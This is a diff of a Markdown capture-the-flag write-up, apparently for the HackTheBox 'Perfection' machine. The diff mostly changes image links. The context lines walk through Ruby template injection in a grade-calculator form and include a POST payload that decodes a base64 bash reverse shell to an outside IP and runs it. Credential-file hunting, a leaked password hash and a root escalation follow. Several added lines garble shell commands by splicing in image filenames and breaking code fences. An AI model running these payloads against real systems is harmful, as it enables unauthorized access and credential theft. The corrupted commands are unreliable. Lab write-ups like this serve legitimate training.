@@ -18,11 +18,11 @@ sudo nmap -Pn -sC -sV -oA 10.129.216.68
 
 The output of the Nmap tool will be:
 
-![720](/assets/img/posts/pasted-image-20260822081454-png.svg)
+![](assets/img/posts/pasted-image-20260822081454-png-svg.svg))
 
 Since we know the target is hosting a webpage on port 80, so lets visit the site and look around testing input fields.
 
-![984](/assets/img/posts/021-perfection-easy-machine-000-png.svg)
+![](assets/img/posts/021-perfection-easy-machine-000-png-svg.svg))
 
 Web app version
 WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
@@ -40,7 +40,7 @@ It looks like the only interactive page we have is on /weighted-grade so lets go
 ### Exploitation & Gaining Access 
 When we navigate to the web page we see a table that takes user input. Assuming the "Grade" and "Weight" columns only take integers, I filled out the table with junk data to see how the page handles the input.
 
-![[Pasted image /assets/img/posts/20250817010606-png.svg]]
+![](assets/img/posts/20250817010606-png-svg.svg))
 
 After submitting that junk information, all we will see is a message saying: "Please reenter! Weights do not add up to 100." So lets see if we can get it to return something else using command injection.
 
@@ -49,20 +49,20 @@ In the category section
 asdf;echo "Cat 1!"
 ```
 
-![[Pasted image /assets/img/posts/20250817010614-png.svg]]
+![](assets/img/posts/20250817010614-png-svg.svg))
 
 The results will be:
 
-![[Pasted image /assets/img/posts/20250817010624-png.svg]]
+![](assets/img/posts/20250817010624-png-svg.svg))
 
  
 
 So it looks like the website is checking the sum of the weights before anything else. Lets make one of the weights equal to 100 and see what happens.
-![[Pasted image /assets/img/posts/20250817010639-png.svg]]
+![](assets/img/posts/20250817010639-png-svg.svg))
 
 The results will be:
 
-![[Pasted image /assets/img/posts/20250817010650-png.svg]]
+![](assets/img/posts/20250817010650-png-svg.svg))
 
 We've now confirmed that the site is checking the total weight value before evaluating any other input. The next few tests I tried the following:
 ```
@@ -84,14 +84,14 @@ That payload worked with me
 category1=a%0A<%25%3Dsystem("ping+-c1+$myIP");%25>
 ```
 
-![[Pasted image /assets/img/posts/20250817010802-png.svg]]
+![](assets/img/posts/20250817010802-png-svg.svg))
 
 ICMP echo from the target box.
 ```
 Sudo tcpdump -i tune0 -A icmp
 ```
 
-![[Pasted image /assets/img/posts/20250817010812-png.svg]]
+![](assets/img/posts/20250817010812-png-svg.svg))
 
 Reverse shell
 ```
@@ -118,7 +118,7 @@ Second, the final post parameters which will send with BurpSuite
 grade1=1&weight1=100&category2=N%2FA&grade2=1&weight2=0&category3=N%2FA&grade3=1&weight3=0&category4=N%2FA&grade4=1&weight4=0&category5=N%2FA&grade5=1&weight5=0&category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi40MC8xMjM0IDA%2BJjEK|+base64+-d+|+bash");%25>
 ```
 
-![[Pasted image /assets/img/posts/20250817010855-png.svg]]
+![](assets/img/posts/20250817010855-png-svg.svg))
 
 Note:
 - The sed command is used to remove `+` from the base64 string to prevent BurpSuite from thinking, it is a space.
@@ -142,21 +142,16 @@ Files owned by the user
 find / -uid 1001 -type f -ls 2>/dev/null | grep -v "/proc*"
 ```
 
-![](/assets/img/posts/pasted-image-20260822084907-png.svg)
+![](assets/img/posts/pasted-image-20260822084907-png.svg))
 
-Files with the name of the user in it
-```
-find / -name "*susan*" -type f -ls 2>/dev/null  
+Files with the name `pasted-image-20260822084907.png`>/dev/null  
 ```
 
-![](/assets/img/posts/pasted-image-20260822084933-png.svg)
+![](assets/img/posts/pasted-image-20260822084933-png.svg))
 
 To display it
 ```
-cat /var/mail/susan
-```
-
-![[Pasted image /assets/img/posts/20250817011054-png.svg]]
+ca`pasted-image-20260822084933.png`-png-svg.svg)
 
 We found an email, it contains information about how passwords are formatted.
 
@@ -165,7 +160,7 @@ Files with the word password in the home directory
 grep -i password -R .
 ```
 
-![[Pasted image /assets/img/posts/20250817011113-png.svg]]
+![](assets/img/posts/20250817011113-png-svg.svg))
 
 ```
 strings Migration/pupilpath_credentials.db | grep -i "susan"      # Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
@@ -217,9 +212,9 @@ susan@perfection:~/ruby_app$ sudo su
 ```
 Once we do, we found that `susan` user is able to act as root.
 
-![](/assets/img/posts/pasted-image-20260822090730-png.svg)
+![](assets/img/posts/pasted-image-20260822090730-png.svg))
 
 Searching for the root flag
 ```
-susan@perfection:~/ruby_app$ find / -name "root.txt" -exec cat {} \;
+susan@pe`pasted-image-20260822090730.png`\;
 ```
